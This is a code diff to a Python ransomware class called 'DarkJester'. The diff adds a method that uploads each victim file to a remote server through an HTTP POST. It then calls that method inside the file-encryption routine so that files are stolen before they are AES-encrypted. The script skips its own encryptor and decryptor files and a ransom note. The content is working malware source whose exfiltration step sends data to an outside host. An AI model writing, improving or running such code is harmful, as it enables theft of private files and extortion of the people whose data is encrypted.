@@ -57,12 +57,27 @@ class DarkJester:
         self.key = get_random_bytes(key_size)
         self.iv = get_random_bytes(iv_size)
 
+    def exfiltrate_file(self, filepath, server_url):
+        try:
+            with open(filepath, 'rb') as file:
+                file_data = file.read()
+                filename = os.path.basename(filepath)
+                files = {'file': (filename, file_data)}
+                response = requests.post(server_url, files=files)
+                if response.status_code == 200:
+                    print(f"[+] File {filename} exfiltrated successfully.")
+                else:
+                    print(f"[-] Failed to exfiltrate {filename}. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"[-] Error exfiltrating {filepath}: {e}")
+
     def encrypt_file(self, filepath):
         try:
             if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_testing_linux.py", "darkjester_encryptor_specific_testing_linux", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_testing_linux.py", "darkjester_decryptor_specific_testing_linux"]:
                 return
             if filepath.endswith('.mime'):
                 return
+            self.exfiltrate_file(filepath, server_url)
             cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
             with open(filepath, 'rb') as src:
                 padded_data = pad(src.read(), AES.block_size)
